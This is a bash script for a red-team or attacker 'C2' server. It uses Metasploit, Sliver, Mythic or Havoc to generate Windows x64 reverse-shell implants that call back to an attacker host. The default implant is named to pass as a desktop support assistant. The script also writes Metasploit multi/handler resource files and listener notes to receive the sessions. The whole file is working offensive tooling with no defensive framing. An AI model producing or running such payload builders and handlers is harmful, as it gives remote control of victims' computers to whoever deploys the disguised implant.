#!/usr/bin/env bash
# Run ON the attack server (stdin from laptop: ssh ... "export ...; bash -s" < remote_server_c2.sh).
# Modes: MODE=payload | MODE=listener_rc
#
# Required env:
#   C2_FRAMEWORK   metasploit | sliver | mythic | havoc
#   LHOST          public callback IP or hostname
#   LPORT          callback port
#   PAYLOAD        absolute path to output .exe (payload mode)
#
# Optional (payload mode for mythic|havoc and sliver fallback):
#   C2_STAGED_IMPLANT_PATH   pre-built implant on this host (default: /home/ubuntu/TSG-DesktopSupportAssistant.exe)
#
# listener_rc mode also needs:
#   RC_OUT         absolute path to write Metasploit resource file (metasploit only)

set -euo pipefail

: "${C2_FRAMEWORK:?Set C2_FRAMEWORK (metasploit|sliver|mythic|havoc)}"
: "${MODE:?Set MODE (payload|listener_rc)}"
: "${LHOST:?Set LHOST}"
: "${LPORT:?Set LPORT}"
: "${C2_STAGED_IMPLANT_PATH:=/home/ubuntu/TSG-DesktopSupportAssistant.exe}"

case "${C2_FRAMEWORK}" in
  metasploit|sliver|mythic|havoc) ;;
  *)
    echo "[!] C2_FRAMEWORK must be one of: metasploit, sliver, mythic, havoc"
    exit 1
    ;;
esac

external_copy() {
  local dest="$1"
  local ext="${C2_STAGED_IMPLANT_PATH}"
  if [[ -f "${ext}" ]]; then
    cp -f "${ext}" "${dest}"
    echo "[+] Copied ${ext} -> ${dest}"
    ls -la "${dest}"
  else
    echo "[!] Place a pre-built Windows x64 implant for ${C2_FRAMEWORK} at:"
    echo "      ${ext}"
    echo "    (build in Mythic/Havoc UI, scp to this host), then re-run this script."
    exit 1
  fi
}

if [[ "${MODE}" == "payload" ]]; then
  : "${PAYLOAD:?Set PAYLOAD to full path of output exe}"

  case "${C2_FRAMEWORK}" in
    metasploit)
      echo "[*] C2=metasploit: generating staged x64 Meterpreter -> ${PAYLOAD}"
      msfdb init 2>/dev/null || true
      msfvenom -p windows/x64/meterpreter/reverse_tcp \
        LHOST="${LHOST}" LPORT="${LPORT}" \
        -f exe -o "${PAYLOAD}" 2>/dev/null
      echo "[+] Payload created: ${PAYLOAD}"
      ;;
    sliver)
      if command -v sliver-client >/dev/null 2>&1; then
        echo "[*] C2=sliver: generating implant (mTLS) -> ${PAYLOAD}"
        if sliver-client generate --mtls "${LHOST}" --os windows --arch amd64 --format exe --save "${PAYLOAD}"; then
          echo "[+] Sliver implant: ${PAYLOAD}"
        else
          echo "[!] sliver-client generate failed — trying staged implant at ${C2_STAGED_IMPLANT_PATH}"
          external_copy "${PAYLOAD}"
        fi
      else
        echo "[!] sliver-client not in PATH — trying staged implant at ${C2_STAGED_IMPLANT_PATH}"
        external_copy "${PAYLOAD}"
      fi
      ;;
    mythic|havoc)
      echo "[*] C2=${C2_FRAMEWORK}: using external payload file"
      external_copy "${PAYLOAD}"
      ;;
  esac

elif [[ "${MODE}" == "listener_rc" ]]; then
  : "${RC_OUT:?Set RC_OUT for listener_rc mode}"

  case "${C2_FRAMEWORK}" in
    metasploit)
      echo "[*] Writing Metasploit handler -> ${RC_OUT}"
      cat > "${RC_OUT}" <<EOF
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 0.0.0.0
set LPORT ${LPORT}
set ExitOnSession false
exploit -j -z
EOF
      echo "[+] Resource script: ${RC_OUT}"
      ;;
    sliver)
      cat > "${RC_OUT}" <<EOF
# Not Metasploit — this is a reminder file for Sliver operators.
# 1) On this host (or your operator station): start sliver-server, then sliver-client.
# 2) Create an mTLS (or HTTP) listener that matches the implant you generated (LHOST was ${LHOST}, port ${LPORT}).
# 3) Interact sessions from the Sliver console.
#
# If you used generate --mtls ${LHOST}, bind mTLS on port ${LPORT} as required by your Sliver version.
EOF
      echo "[+] Wrote operator notes (Sliver): ${RC_OUT}"
      ;;
    mythic|havoc)
      cat > "${RC_OUT}" <<EOF
# ${C2_FRAMEWORK}: no Metasploit resource file.
# Start a listener in ${C2_FRAMEWORK} on port ${LPORT} that matches the payload you copied to:
#   ${C2_STAGED_IMPLANT_PATH}
EOF
      echo "[+] Wrote operator notes (${C2_FRAMEWORK}): ${RC_OUT}"
      ;;
  esac
else
  echo "[!] MODE must be payload or listener_rc"
  exit 1
fi
